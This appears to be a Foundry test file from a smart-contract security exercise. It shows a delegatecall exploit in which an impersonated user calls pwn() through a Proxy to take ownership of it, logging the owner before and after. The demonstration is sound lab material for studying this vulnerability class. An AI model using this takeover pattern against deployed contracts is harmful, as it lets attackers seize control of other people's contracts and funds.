// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Proxy, Delegate} from "../src/Delegatecall.sol";

contract ProxyExploit is Test {
    Proxy proxy;
    Delegate delegate;
    address alice;

    function setUp() public {
        delegate = new Delegate();
        proxy = new Proxy(address(delegate));
        alice = vm.addr(1);
    }

    function testDelegatecall() public {
        console.log("Alice address: ", alice);
        console.log("Proxy owner: ", proxy.owner());

        console.log("Changing owner of Proxy to Alice...");
        vm.prank(alice);
        (bool success,) = address(proxy).call(abi.encodeWithSignature("pwn()"));
        require(success, "call failed");

        console.log("New proxy owner: ", proxy.owner());
    }
}
